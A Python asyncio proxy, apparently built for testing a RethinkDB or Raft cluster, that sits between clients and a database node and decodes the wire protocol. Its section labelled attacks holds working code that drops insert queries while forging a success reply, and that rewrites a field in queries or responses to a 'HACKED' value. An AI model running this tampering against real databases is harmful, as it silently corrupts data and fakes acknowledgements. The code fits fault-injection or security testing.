import os, asyncio, binascii
from typing import Optional
import struct, json
import json, struct, binascii

IN = "OTHER->PROXY->MAL"
OUT = "MAL->PROXY->OTHER"

PROXY_HOST = os.getenv("PROXY_HOST", "rethink1_real")
RAFT_HOST = "0.0.0.0" 
RAFT_PORT = int(os.getenv("RAFT_PORT", "29015"))

CLIENT_HOST = "0.0.0.0"
CLIENT_PORT = int(os.getenv("CLIENT_PORT", "28015"))

PORT_OFFSET = 0

BUFSIZE = 65536


def old_decode_rethinkdb_message(data: bytes):
    # --- Handshake magic (4 bytes) ---
    if len(data) == 4:
        val = struct.unpack("<I", data)[0]
        return f"Handshake version int: 0x{val:08x}"

    # --- Null-terminated JSON (handshake JSONs) ---
    if b"\x00" in data:
        try:
            text = data.rstrip(b"\x00").decode("utf-8")
            return f"Handshake JSON: {json.loads(text)}"
        except Exception:
            return 'Handshake string: '+ str(data.rstrip(b"\x00").decode("utf-8", "ignore"))

    # --- Query/Response frames ---
    if len(data) >= 12:
        token = struct.unpack("<Q", data[:8])[0]
        (length,) = struct.unpack("<I", data[8:12])
        body = data[12:12+length]
        try:
            obj = json.loads(body.decode("utf-8"))
            return f"Query/Response token={token} -> {obj}"
        except Exception:
            snippet = binascii.hexlify(body[:64]).decode()
            return f"token={token} invalid JSON: {snippet}..."

    # --- Fallback ---
    return f"Unknown frame: {binascii.hexlify(data[:32]).decode()}"

# ----------------- Decoding ----------------- #

def has_field(obj, field):
    try:
        return field in obj[1][1][1]
    except Exception:
        return False

def decode_rethinkdb_message(data: bytes):

    try:
        token = struct.unpack("<Q", data[:8])[0]
        (length,) = struct.unpack("<I", data[8:12])
        body = data[12:12+length]
        obj = json.loads(body.decode("utf-8"))
        return token, obj
    except:
        pass
    return None, None

def encode_rethinkdb_message(token: int, obj: dict | list) -> bytes:
    """
    Build a RethinkDB JSON-protocol message:
      [8-byte token][4-byte length][UTF-8 JSON payload]
    """
    # 1. Convert the object to JSON text
    body = json.dumps(obj, separators=(",", ":")).encode("utf-8")

    # 2. Prefix with token and length
    header = struct.pack("<Q", token) + struct.pack("<I", len(body))

    # 3. Concatenate and return
    return header + body

# ------------------- ATTACKS ------------------- #

# just relays bytes
async def no_attack(data: bytes, in_or_out: str, peer_writer, port):
    return data

# sends fake OK
async def drop_attack(data: bytes, in_or_out: str, writer, port):
    if port == 28015:
        token, obj = decode_rethinkdb_message(data)
        if token == 0 and in_or_out == IN and obj is not None and has_field(obj, "aid"):
            print(f"[DROPPING {in_or_out}:{port}] {len(data)} bytes -> {obj}")

            # send fake OK, use key eeee...
            resp_string = {'t': 1, 'r': [{'deleted': 0, 'errors': 0, 'generated_keys': ['eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee'], 'inserted': 1, 'replaced': 0, 'skipped': 0, 'unchanged': 0}]}
            data_to_send = encode_rethinkdb_message(0, resp_string)
            
            await writer.drain()
            writer.write(data_to_send)
            await writer.drain()
            print("SENT OK")
            
            # Do not forward bytes
            return None
        
    return data

async def rewrite_attack(data: bytes, in_or_out: str, writer, port):

    if port == 28015:
        token, obj = decode_rethinkdb_message(data)
        if token is not None:
            print(f"[SNIFFED {in_or_out}:{port}] {len(data)} bytes -> {obj}")
            
            # can change whatever you want (we chose aid for simplicity)
            if in_or_out == IN and has_field(obj, "aid"):
                obj[1][1][1]['aid'] = 'HACKED69@mail.com:HACK_agent' 
                print(f"[HACKED {in_or_out}:{port}] {len(data)} bytes -> {obj}")

            # re-encode tampered message
            encoded = encode_rethinkdb_message(token, obj)
            return encoded
        
    return data

async def incorrect_read_attack(data: bytes, in_or_out: str, writer, port):

    if port == 28015:
        print("here1")
        print(in_or_out == OUT)
        token, obj = decode_rethinkdb_message(data)
        print(obj)
        if token is not None:
            print(f"[SNIFFED {in_or_out}:{port}] {len(data)} bytes -> {obj}")
            
            # can change whatever you want (we chose aid for simplicity)
            if in_or_out == OUT:
                try:
                    obj['r'][0]['aid'] = 'HACKED69@mail.com:HACK_agent' 
                # obj[1][1][1]['aid'] = 'HACKED69@mail.com:HACK_agent' 
                    print(f"[HACKED {in_or_out}:{port}] {len(data)} bytes -> {obj}")
                    encoded = encode_rethinkdb_message(token, obj)
                    print("here2")
                    return encoded
                except:
                    return data
            # re-encode tampered message

        
    return data

# ----------------- END ATTACKS ----------------- #


# Chosen attack goes here:
# -----------------------
ATTACK = no_attack  # |
# -----------------------


async def pipe(reader, writer, peer_writer, attack_fn, in_or_out, host_in,port):
    """
    Forward data from reader -> peer_writer, applying attack on read bytes.
    """
    try:
        while True:
            data = await reader.read(BUFSIZE)
            if not data:
                # remote closed the connection cleanly
                break
            # pass data, if it was incoming or outgoing connection, writer to who sent, and port
            out = await attack_fn(data, in_or_out, writer, port)
            if out is None:
                # If attack_fn returns None, drop data
                continue
            peer_writer.write(out)
            await peer_writer.drain()
    except Exception as e:
        print(f"[{in_or_out}] error: {e}")
    finally:
        # Close the writer connected to the peer
        try:
            peer_writer.close()
            await peer_writer.wait_closed()
        except Exception:
            pass

async def handle_client(in_reader, in_writer):
    # identify client and local info
    host_in, _ = in_writer.get_extra_info("peername")
    _, port = in_writer.get_extra_info("sockname") or ("0.0.0.0", 0)
    offset_port = int(port) + PORT_OFFSET

    print(f"[PROXY] client {host_in} -> trying to connect to {PROXY_HOST}:{offset_port}")

    # connect to backend
    try:
        out_reader, out_writer = await asyncio.open_connection(PROXY_HOST, offset_port)
    except Exception as e:
        print("[PROXY] cannot connect to remote:", e)
        try:
            in_writer.close()
            await in_writer.wait_closed()
        except:
            pass
        return

    # start the in and out tasks
    t1 = asyncio.create_task(pipe(in_reader, in_writer, out_writer, ATTACK, IN, host_in, port))
    t2 = asyncio.create_task(pipe(out_reader, out_writer, in_writer, ATTACK, OUT, host_in, port))

    # wait for both directions to finish
    try:
        await asyncio.gather(t1, t2)
    except Exception as e:
        print(f"[PROXY] gather error: {e}")
    finally:
        # ensure both sockets are closed
        try:
            in_writer.close()
            await in_writer.wait_closed()
        except:
            pass
        try:
            out_writer.close()
            await out_writer.wait_closed()
        except:
            pass

    print("[PROXY] connection closed")

async def main():
    
    # communication with the proxied raft node
    s1 = await asyncio.start_server(handle_client, RAFT_HOST, RAFT_PORT)
    
    # communication with the client
    s2 = await asyncio.start_server(handle_client, CLIENT_HOST, CLIENT_PORT)
    
    
    print(f"[PROXY] listening {RAFT_HOST}:{RAFT_PORT} <-> {PROXY_HOST}:{RAFT_PORT}")
    print(f"[PROXY] listening {CLIENT_HOST}:{CLIENT_PORT} <-> {PROXY_HOST}:{CLIENT_PORT}")
    
    await asyncio.gather(s1.serve_forever(), s2.serve_forever())

if __name__ == "__main__":
    asyncio.run(main())
